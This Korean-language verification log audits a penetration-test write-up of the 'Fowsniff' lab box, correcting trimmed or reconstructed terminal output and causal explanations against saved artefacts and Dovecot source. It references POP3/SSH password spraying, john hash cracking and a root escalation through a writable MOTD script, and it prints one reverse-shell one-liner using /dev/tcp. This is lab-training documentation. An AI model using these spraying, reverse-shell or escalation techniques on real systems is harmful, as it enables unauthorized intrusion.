# Fowsniff — 적대적 검증 + 정정 (2026-08-20)

대상: `03. PG\Fowsniff.md` (신규 작성, 664행 → 797행)
근거: Kali `~/PG/Fowsniff/` 산출물 24개 · `~/.john/john.log` · Dovecot 2.2.22 소스 · Kali 실행 검증 5건

> **baseline 없음** — `git log -- "03. PG/Fowsniff.md"` 가 비어 있다. 이 노트는 아직 커밋된 적이 없는 신규 파일이라 "개작 전 원본"과 대조할 수 없었다. 검증은 전량 Kali 산출물 + 1차 사료 대조로만 했다.

---

## 1. 고친 것

| 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 | 근거 |
|---|---|---|---|
| §1 Nmap 블록 | `Nmap scan report for 192.168.248.18`·`ssh-hostkey` 4행·`http-server-header`·`# Nmap done ...` 이 표시 없이 빠져 있었다 | `nmap.log` 원문 복원(OS 지문 블록만 명시적 생략). 색인 파이프라인의 `IP_RE` 가 `Nmap scan report for` 줄에 걸려 있어, 빠져 있으면 `ip` 필드가 아예 안 잡힌다 | `nmap.log`, `_INDEX/_tools/extract.py:136` |
| §1 top-200 근거 | "top-200 스캔이 이미 전부 찾았다"만 있고 로그가 없었다 | `quick.log` 원문(7.90초) 블록을 추가해 `-p-`(41.12초)와 나란히 놓음 | `quick.log`, `nmap.full.txt` |
| §1 gobuster | 301 항목의 `[--> http://.../images/]` 리다이렉트 주석 삭제 | `gobuster.log` 원문 복원 | `gobuster.log` |
| §1 robots.txt | "`Disallow: /` 한 줄"만 단정 | 26바이트 = `User-agent: *` + `Disallow: /` 두 줄로 검산해서 서술 | `gobuster.log` (Size: 26) |
| §1 security.txt | 마지막 줄(`No one is safe from my 1337 skillz!`) 누락 | 복원 | `security.txt` |
| §2 john | 정확했으나 검산 근거가 없었다 | 크랙 출력 순서 = rockyou 행 순서라는 성질과 실제 행번호 8개를 추가 | rockyou 실측 (17577/81318/119135/166758/622357/2424341/9279098/9627898) |
| §3 `pop3spray.py` | **소스가 손질돼 있었다** — `import socket, sys` → `import socket, time`, 별도 `import time` 줄 삭제, `r1=rd(s)` → `rd(s)` | 디스크의 실제 파일로 바이트 복원. `if p.startswith('<')` 의 역할(미크랙 계정 스킵) 해설 추가 | `pop3spray.py` |
| §3 POP3 `LIST` | `USER` 응답 `+OK` 한 줄 누락 (노트 본문은 그 응답을 설명하는데 블록에는 없었다) | 복원 + "`USER` 응답은 계정 존재와 무관하므로 열거에 못 쓴다" 추가 | `mail_seina.txt` |
| §3 `nc` 대화형 블록 | 산출물에 없는 대화형 세션을 실측처럼 실었다 | 삭제하지 않고, 응답 줄이 `mail_seina.txt` 와 동일하며 세션 자체는 로그로 안 남겼다고 명시 | `mail_seina.txt` |
| §3 SSH 스프레이 출력 | 호스트키·post-quantum 경고를 전부 지워 깨끗한 표처럼 만들었다 | `try3_ssh_spray.log` 원문 1건 전문 + 나머지 `[동일 경고]` 표시. 경고가 결과와 한 줄에 섞이는 것이 `tr '\n' ' '` 의 대가라는 해설 추가 | `try3_ssh_spray.log` |
| §3 `UserKnownHostsFile=/dev/null` | **인과가 뒤집혀 있었다** — "없으면 계정마다 호스트키 확인이 걸린다". 로그를 보면 **있는데도** 매 연결마다 `Permanently added` 경고가 뜬다 | 실제 이유(리버트로 호스트키가 바뀌면 `StrictHostKeyChecking=no` 만으로는 못 뚫는다 / `known_hosts` 오염 방지)로 정정 | `try3_ssh_spray.log` |
| §4 `sudo -S -l` | 출력이 `Sorry, user baksteen may not run sudo on fowsniff.` 한 줄로 **재구성**돼 있었다 | 실제 로그의 토막난 원문(`[sudo] password for baksteen: SoConnection to 192.168.248.18 closed.` / ` fowsniff.`)으로 복원하고, `-S` 가 프롬프트를 stderr 로 뿌려 `-tt` PTY 출력과 섞인 것이라고 설명 | `enum_baksteen.log` |
| §4 `/etc/crontab` | **코드펜스 안에 산문 요약**(`# ... 배포판 기본 4줄(run-parts hourly/daily/weekly/monthly)만`)이 출력인 척 들어 있었다 | 실제 출력으로 교체. `/etc/cron.d` 에 `popularity-contest` 만 있다는 사실도 산문으로 반영 | `enum_baksteen.log` |
| §4 `find -group users -writable` | 결과가 `...` 로 뭉개져 있었다 | 실제 항목 일부 복원 + "홈이 소음이니 `/opt`·`/usr/local`·`/srv`·`/var` 를 먼저 본다"는 읽는 법 추가 | `enum2_writable.log` |
| §4 `grep -n motd /etc/pam.d/sshd` | 매치 4행 중 주석 2행(31·32)을 표시 없이 삭제 | 4행 전부 복원. 지운 주석이 오히려 "pam 은 이미 만들어진 파일을 출력만 한다"를 설명한다 | `enum3_motd_mechanism.log` |
| §4 `/proc` 조상 체인 | **원문에 없는 공백이 삽입**돼 있었다 (`sh/opt/cube/cube.sh` → `sh /opt/cube/cube.sh` 등 5행) | 원문(줄바꿈 위치 포함) 복원 + `tr -d '\0'` 이 아니라 `tr '\0' ' '` 여야 한다는 함정 해설 추가 | `enum4_motd_parent.log` |
| §4 `id` 귀속 | "동일한 프로브에서 `id` 도 찍었다" — 로그상 `id` 는 **1차 프로브**(pid 1852/1851) 소속이고 조상 체인은 2차 프로브(pid 1882~709)다 | 프로브가 두 번이었다고 정정하고 1차 출력도 실었다. 1차만으로 이미 `uid=0` 이 확정된다는 점을 살림 | `enum4_motd_parent.log` |
| §4 `ls -la /opt/cube/` | 산출물에 없음 | **삭제하지 않음.** 파일 모드·크기는 시간순 기록·`cube.sh.orig` 로 재확인되고, 디렉터리 `777` 만 재확인 불가임을 블록 아래에 명시 | `writeup_notes.txt`, `cube.sh.orig` |
| §4 `cat 00-header` | 산출물에 없음 | 동일 처리. `enum2_writable.log` 가 뒷받침하는 범위(`root:root 755`, 1248바이트)를 명시 | `enum2_writable.log` |
| §4 `ss -lntp` | 프로세스 열이 없는 것이 설명되지 않았다 | root 소유 소켓이라 비특권 `ss` 에 안 보이는 것이라고 설명 추가(Kali 실행으로 형식 확인) | Kali 실행 |
| §4 cube.sh 내용 | "ASCII 아트 `printf` 뿐" | 맞다. 셔뱅이 없어 호출부가 `sh` 를 명시한다는 점 추가 | `cube.sh.orig` |
| §4 대안 경로 `stone` | "홈에 `Maildir` 이 따로 있어" 단정 | `/home` 링크 수(4 vs 3) 근거임을 밝히고 `[가정]` 강등. 홈이 `drwxrwx--- stone:stone` 이라 못 봤다고 명시 | `enum_baksteen.log` |
| §6 이미지 헛다리 | `file` 출력이 `...` 로 잘려 있었고 "HTML5UP 데모 이미지"가 근거 없이 단정 | `file` 원문 복원(pic01.jpg 포함) + `img1.jpg` 와 `pic01.jpg` 가 같은 1200x297, 셋의 XMP `OriginalDocumentID` 가 같은 uuid 라는 실측 근거 추가. README 원문도 인용 | Kali `file`/`strings` 재실행, `README.txt` |
| §6 try1 트레이스백 | `...` 로 뭉개짐 | 원문 전문 복원 | `try1_pop3spray.log` |
| §6 **Dovecot 지연 인과** | 메커니즘이 `[가정]` 이었고, "타임아웃 40 + 간격 3초로 고쳤다"가 인과를 잘못 짚었다 | Dovecot 2.2.22 소스로 확정: penalty 사전지연 0→없음/1→4s/2→8s/3+→15s(상한), `auth_failure_delay` 기본 2s, 만료 29s. 1·2·3번째 ≈ 2/6/10초로 8초 타임아웃이 정확히 3번째에서 터지는 것을 산술로 맞춤. **`sleep(3)` 은 만료 29초 앞에서 무효**임을 정정 | Dovecot `auth-settings.c`·`auth-penalty.h`·`auth-penalty.c`·`auth-request-handler.c` |
| §6 `sudo -l` 블로킹 | 실패 실행 출력이 실측처럼 코드펜스에 들어 있었다 | 코드펜스를 걷고 산문으로 서술 + "이 실행의 출력은 파일로 남기지 않았다"고 명시. 프롬프트 띄우는 명령 목록(`ssh`·`su`·`passwd`·`apt`)으로 일반화 확장 | `writeup_notes.txt` 15:02 |
| §6 시간 배분 | "전체 약 20분 / 정찰 6분 / 권한상승 5분" — 시간순 기록과 안 맞는다 | 14:53→15:05 = 약 12분으로 정정하고 구간이 겹친다는 점 명시 | `writeup_notes.txt` |
| §7 | 항목 9개 | `/proc` 조상 추적을 독립 항목(4번)으로 승격 — 이 박스에서 가장 전이력 높은 절차다 | — |
| §8 Dovecot | "`disable_plaintext_auth = yes` — 현재 `no` 라" | 현재값 `no` 는 저장된 산출물로 확인되지 않아 단정 제거. "auth penalty 는 늦출 뿐 40초 타임아웃으로 우회됐다"로 대체 | 산출물 부재 |
| 남긴 흔적 | **"Kali `known_hosts` 에 첫 SSH 스프레이 때 `192.168.248.18` 호스트키가 추가됐다" — 실측으로 반증** | 정정: 해당 항목이 없고 파일 mtime 도 11:37(작업 시작 14:53 이전). `/dev/null` 이 설계대로 동작한 것 | Kali `grep 192.168.248.18 ~/.ssh/known_hosts` = 0건, `ls -la ~/.ssh/known_hosts` |
| 프론트매터 | `cves` 키 없음 | `cves: []` 명시 추가(동작은 동일 — `extract.py:declared_cves` 는 키가 없으면 `[]` 반환). 선언 뒤 주석은 붙이지 않았다 | `_INDEX/_tools/extract.py:185-201` |
| 상단 | 정정 이력 없음 | `[!warning] 적대적 검증 정정 이력` 콜아웃 신설 — 정정표 + 반증 목록 + "재검증 불가 블록" 목록 | — |

**삭제한 것: 없다.** 근거가 부족한 블록은 전부 남기고 표시로 강등했다. 유일하게 코드펜스를 걷어낸 것은 §6 `sudo -l` 블로킹 출력이고, 원문은 아래에 보존한다.

```
$ ssh -tt ... baksteen@192.168.248.18 'id; echo ---SUDO; sudo -l; ...'
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
---SUDO
[sudo] password for baksteen:
```
(사실관계는 맞지만 이 실행의 출력이 어떤 파일로도 저장되지 않아 코드펜스를 유지할 근거가 없었다. 내용은 산문으로 전부 옮겼다.)

§8 에서 지운 단정 한 줄도 보존한다:
```
- **Dovecot 에 TLS 강제**(`disable_plaintext_auth = yes`) — 현재 `no` 라 평문 인증이 그대로 통과한다.
```
(`disable_plaintext_auth` 의 실제 설정값을 확인한 산출물이 없다. `nmap` 의 `SASL(PLAIN)`·`USER` 는 평문 인증이 **가능하다**는 것까지만 말해준다.)

---

## 2. 내가 지적으로 올렸다가 다시 반증한 것 — 노트가 옳았다

검증 절차 자체의 정확도 판단용으로 남긴다. 아래는 전부 "손질/날조 의심"으로 올렸다가 **확인 결과 노트가 정확했던** 것들이다.

1. **john 크랙 출력 순서** — `john_cracked.txt` 는 해시 파일 순서(`mailcall, bilbo101, ...`)인데 노트는 다른 순서(`scoobydoo2, orlando12, ...`)라 지어낸 것으로 의심했다.
   → **반증.** rockyou 행번호를 뽑아보니 17577 / 81318 / 119135 / 166758 / 622357 / 2424341 / 9279098 / 9627898 로 **노트 순서와 정확히 일치**. wordlist 모드의 크랙 순서 = 사전 행 순서다. 노트가 맞았고, 오히려 이걸 노트에 검산법으로 추가했다.
   또 `~/.john/john.log` 가 `Command line: john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`, `Loaded a total of 9 password hashes with no different salts`, `Algorithm: MD5 128/128 AVX 4x3`, `+ Cracked ?` × 8 로 노트 블록을 전부 뒷받침한다.

2. **`listening on [any] 443 ...`** — Kali 기본 `nc` 가 netcat-openbsd 면 `Listening on 0.0.0.0 443` 이 나와야 하므로 형식이 틀렸다고 봤다.
   → **반증.** 이 Kali 의 `nc` 는 netcat-traditional `[v1.10-50.1]` 이고, 실제로 띄워보니 `listening on [any] 39443 ...` 이 나온다. 노트 형식이 맞다.

3. **`ss -lntp` 에 `users:(("nc",pid=...))` 열이 없다** — 잘라낸 것으로 의심했다.
   → **반증.** 리스너를 `sudo` 로 띄웠으니 root 소유 소켓이고 비특권 `ss` 에는 프로세스가 안 보인다. 덤으로 열 정렬(`0.0.0.0:443` 뒤 공백 8칸 vs 내 재현의 `0.0.0.0:39443` 뒤 6칸)도 포트 자릿수 차이와 정확히 맞는다 — 손으로 지어낸 정렬이 아니다.

4. **`dash: 1: Syntax error: Bad fd number`** — 표준 문서에 자주 인용되는 문구라 베껴 넣었을 가능성을 봤다.
   → **반증.** Kali 에서 실행, 문구·exit 2 까지 일치.

5. **`auth_failure_delay = 2 secs`** — `doveconf` 출력이 산출물에 없어 날조 후보였다.
   → **반증(값 자체).** Dovecot 2.2.22 `src/auth/auth-settings.c:271` 이 `.failure_delay = 2`. 값은 정확하다. 다만 `doveconf` **실행 자체**는 확인할 수 없어 그 사실만 노트에 표시했다.

6. **이미지 해상도 1920x573 / 1200x297** — `file` 출력이 `...` 로 잘려 있어 의심했다.
   → **반증.** `~/PG/Fowsniff/web/` 의 세 파일에 `file` 을 다시 돌려 전부 일치. XMP `CreatorTool="Adobe Photoshop CS6 (Windows)"` 도 일치.

7. **`~/.zsh_history` 에 Fowsniff 흔적이 0건** — 부재를 근거로 삼을 뻔했다.
   → **부재 증거로 쓰지 않았다.** 이 박스는 전 과정이 비대화형 SSH 호출로 돌아 zsh 가 기록할 수 있는 명령이 애초에 없다. 실제로 히스토리의 마지막 `nnmap` 은 `192.168.248.222`(다른 박스)다.

8. **`/etc/pam.d/sshd` 의 `noupdate` 해석** — "pam_motd 가 root 로 실행"이라는 흔한 오류를 노트가 저질렀는지 확인했다.
   → **노트가 옳았다.** 오히려 `noupdate` 를 정확히 짚고 `/proc` 으로 실제 부모(sshd `[priv]` → `run-parts`)를 증명했다. 이 절이 노트에서 가장 잘 쓰인 부분이다.

9. **플래그 2개** — `proof_user.txt`·`proof_root.txt` 와 바이트 단위로 일치. 둘 다 대화형 셸에서 원위치 `cat` 이고 `whoami; id; hostname; hostname -I; date` 가 같은 줄에 묶여 있다. 웹셸 경유 아님.

10. **타임존** — 타겟 `date` 가 `EDT 02:03`, 산출물 mtime 이 `KST 15:03`. 13시간 차로 같은 순간이다. 노트가 이미 정확히 환산해 적어놨다.

---

## 3. 총괄 판단이 필요한 것 — taxonomy

`tech/svc/pop3` 와 `tech/lin/motd` 는 **볼트 최초**다(`grep -rl` 결과 Fowsniff 노트와 자동생성 색인뿐). 그런데 **직전 ClamAV 사례와는 성격이 다르다:**

- 둘 다 **기존 브랜치**(`tech/svc/`, `tech/lin/`) 아래 leaf 라서 `01. 기법별 색인.md` 에 정상적으로 그룹핑돼 들어갔다. 실제로 색인 273행에 `### motd #tech/lin/motd`, 418행에 `### pop3 #tech/svc/pop3` 로 렌더돼 있다 — **시험장 검색에 걸린다.**
- 다만 `build_index.py` 의 `TECH_INFO` 사전에 없어서 **설명 문구가 비어 있다.** 같은 상태인 기존 태그가 이미 여럿이다: `tech/svc/smtp`(Bratarina) · `tech/svc/nfs`(Scarlet) · `tech/svc/salt`(Twiggy) · `tech/cred/reuse`(Cockpit·Codo·MiddlewareBypass·plum·Zipper 5건) · `tech/enum/osint`(Fowsniff). 즉 이 볼트에서는 **taxonomy 미등재 leaf 가 이미 관행**이고, 검색은 정상 동작한다.

→ **태그는 그대로 두었다.** 같은 뜻의 기존 태그가 없다(`tech/svc/smtp` 는 다른 프로토콜, `tech/lin/cron` 은 시간 트리거라 로그인 트리거인 MOTD 와 다르다).

**총괄 판단 요청**: `build_index.py:TECH_INFO` 에 아래 6개 설명을 추가할지. 공유 인프라라 손대지 않았다.

```python
"tech/svc/pop3":   ("POP3 / IMAP 메일함", "USER·PASS·LIST·RETR — 메일 본문이 다음 자격증명"),
"tech/lin/motd":   ("MOTD 권한상승", "/etc/update-motd.d/ 체인이 로그인마다 root 로 실행"),
"tech/svc/smtp":   ("SMTP", "VRFY 사용자 열거 · 명령 인젝션"),
"tech/svc/nfs":    ("NFS 공유", "showmount -e · no_root_squash"),
"tech/svc/salt":   ("SaltStack", "ZeroMQ 4506 인증 우회"),
"tech/cred/reuse": ("자격증명 재사용", "한 서비스에서 얻은 비번을 다른 서비스에 재시도"),
"tech/enum/osint": ("OSINT", "타겟 밖 유출 덤프·공개 자료 수집"),
```

---

## 4. 근거 출처

**Kali 산출물** (`ssh kali@10.44.44.128:~/PG/Fowsniff/`)
`nmap.log` · `nmap.full.txt` · `quick.log` · `gobuster.log` · `dump.txt` · `hashes.txt` · `users.txt` · `creds.txt` · `john_cracked.txt` · `pop3spray.py` · `try1_pop3spray.log` · `try2_pop3spray.log` · `try3_ssh_spray.log` · `mail_seina.txt` · `enum_baksteen.log` · `enum2_writable.log` · `enum3_motd_mechanism.log` · `enum4_motd_parent.log` · `cube.sh.orig` · `proof_user.txt` · `proof_root.txt` · `security.txt` · `README.txt` · `web/{banner,img1,pic01}.jpg` · `writeup_notes.txt`(43행 시간순)
추가: `~/.john/john.log` · `~/.john/john.pot` · `~/.ssh/known_hosts` · `~/.zsh_history`

**Kali 에서 직접 실행한 명령**
```
for w in ...; do grep -n -x -m1 -F "$w" /usr/share/wordlists/rockyou.txt; done   # 크랙 순서 검산
nc -h                                                                            # [v1.10-50.1] = traditional
timeout 3 nc -lvnp 39443 ; ss -lntp | grep 39443                                 # 리스너 출력/열 정렬 형식
dash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'                                # Bad fd number
cd ~/PG/Fowsniff/web && file * ; strings -n 8 banner.jpg | head                   # 해상도·XMP
grep -c "192.168.248.18" ~/.ssh/known_hosts ; ls -la --time-style=full-iso ~/.ssh/known_hosts
```

**1차 사료** — Dovecot core 2.2.22 태그 소스 (raw.githubusercontent.com/dovecot/core/2.2.22)
- `src/auth/auth-settings.c:231,271` — `DEF(SET_TIME, failure_delay)` / `.failure_delay = 2`
- `src/auth/auth-penalty.h` — `AUTH_PENALTY_INIT_SECS 2` · `AUTH_PENALTY_MAX_SECS 15` · `AUTH_PENALTY_MAX_PENALTY 4` · `AUTH_PENALTY_TIMEOUT (2+4+8+15)`
- `src/auth/auth-penalty.c:54-61` — `auth_penalty_to_secs()` = `2` 를 penalty 번 두 배, 상한 15
- `src/auth/auth-request-handler.c:230-233,437-444` — 실패마다 `last_penalty + 1`, 다음 요청에 `timeout_add(secs*1000)` 사전 지연

**볼트**
- `_INDEX/_tools/extract.py` (`IP_RE`·`DOM2_RE`·`declared_cves`) · `_INDEX/_tools/build_index.py` (`TECH_INFO`) · `_INDEX/01. 기법별 색인.md` 273·418행
- `파일보관\` — Fowsniff 스크린샷 **없음**(912개 전수 확인). 노트도 스크린샷을 참조하지 않아 모순 없음
- `git log -- "03. PG/Fowsniff.md"` — **비어 있음**(신규 파일, baseline 부재)

**하지 않은 것**
- 타겟 재접속(박스 정지). 노트에 재접속 전제 서술이 있는지 따로 확인했고 **없었다**
- `refresh.ps1` 실행(총괄이 이미 실행), `_STATUS.md` 수정, taxonomy 수정, 포털 접근
- `doveconf` / `ls -la /opt/cube/` / `cat 00-header` 재확인 — 박스가 없어 불가. 해당 블록은 삭제 대신 표시 처리

## 본문에서 이관한 정정 이력

(2026-08-20 이관 — 원래 `Fowsniff.md` 상단에 있던 블록. 원문 그대로.)

> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 초고를 `~/PG/Fowsniff/` 산출물 24개와 1차 사료로 대조한 결과. 플래그·자격증명·명령은 손대지 않았고, 고친 것은 **손질된 터미널 블록과 인과 설명**이다.
>
> | 위치 | 무엇이 틀렸나 | 어떻게 고쳤나 |
> |---|---|---|
> | §1 nmap | `Nmap scan report for ...`·`ssh-hostkey`·`http-server-header` 줄이 표시 없이 빠져 있었다 (색인의 `ip` 추출도 이 줄에 걸려 있다) | `nmap.log` 원문으로 복원, 생략은 명시 |
> | §1 gobuster | 301 항목의 `[--> ...]` 리다이렉트 주석 삭제 | `gobuster.log` 원문 복원 |
> | §3 `pop3spray.py` | 소스가 다듬어져 있었다 (`import sys` 삭제, `import time` 위치 이동, `r1=` 제거) | 디스크의 실제 파일로 복원 |
> | §3 POP3 `LIST` | `USER` 에 대한 응답 `+OK` 한 줄 누락 | `mail_seina.txt` 원문 복원 |
> | §3 SSH 스프레이 | 출력의 호스트키·post-quantum 경고를 전부 지워 깨끗하게 보이게 함 | `try3_ssh_spray.log` 원문 1건 전문 + 나머지 생략 표시 |
> | §3 `UserKnownHostsFile=/dev/null` | "없으면 계정마다 호스트키 확인이 걸린다" — 반대다. 로그를 보면 **있는데도** 매번 경고가 뜬다 | 실제 이유(리버트 후 호스트키 변경 차단 회피)로 정정 |
> | §4 `sudo -S -l` | 출력이 깔끔한 한 줄로 재구성돼 있었다 | `enum_baksteen.log` 의 뒤엉킨 원문 복원 + 왜 엉켰는지 설명 |
> | §4 `/etc/crontab` | 코드펜스 안에 산문 요약(`# ... 배포판 기본 4줄만`)이 출력인 척 들어 있었다 | 실제 출력으로 교체 |
> | §4 `grep -n motd /etc/pam.d/sshd` | 매치 4행 중 주석 2행(31·32)을 표시 없이 삭제 | 4행 전부 복원 — 지운 2행이 오히려 메커니즘을 설명한다 |
> | §4 `/proc` 조상 체인 | 원문에 없는 공백이 삽입돼 있었다 (`sh/opt/cube/cube.sh` → `sh /opt/cube/cube.sh`) | 원문 복원 + `tr -d '\0'` 함정으로 설명 |
> | §4 `id` | "동일한 프로브에서 `id` 도 찍었다" — 로그상 `id` 는 **1차 프로브**(pid 1852) 소속이고 조상 체인은 2차 프로브(pid 1882)다 | 프로브 두 번이었다고 정정, 둘 다 실었다 |
> | §6 Dovecot 지연 | 메커니즘이 `[가정]` 이었고 "타임아웃 40초 + 간격 3초로 고쳤다"가 인과를 잘못 짚었다 | Dovecot 2.2.22 소스로 penalty 수치(0/4/8/15초) 확정. `sleep(3)` 은 무효(만료 29초)임을 정정 |
> | 남긴 흔적 | "Kali `known_hosts` 에 `192.168.248.18` 이 추가됐다" — **실측으로 반증**. 파일에 없고 mtime 도 11:37(작업 시작 전)이다 | 정정 |
>
> **검증했더니 초고가 맞았던 것** — john 크랙 출력 순서(rockyou 행번호 순과 정확히 일치), `listening on [any] 443 ...`(Kali `nc` 는 netcat-traditional v1.10-50.1), `ss -lntp` 에 프로세스 열이 없는 것(root 소유 소켓), `dash: 1: Syntax error: Bad fd number`, `auth_failure_delay = 2 secs`, 이미지 해상도 1920x573·1200x297. 근거는 §9.
>
> **재검증이 불가능한 블록** — `ls -la /opt/cube/` · `cat /etc/update-motd.d/00-header` · `doveconf` · nc 리스너 스크롤백은 파일로 저장되지 않았고 박스가 내려가 다시 찍을 수 없다. 본문에서 해당 위치에 표시해 두었다. **날조로 판정하지 않았다** — 부재는 미실행의 증거가 아니다. 이 박스는 전 과정이 비대화형 SSH 로 돌아 `~/.zsh_history` 에도 흔적이 하나도 없다.
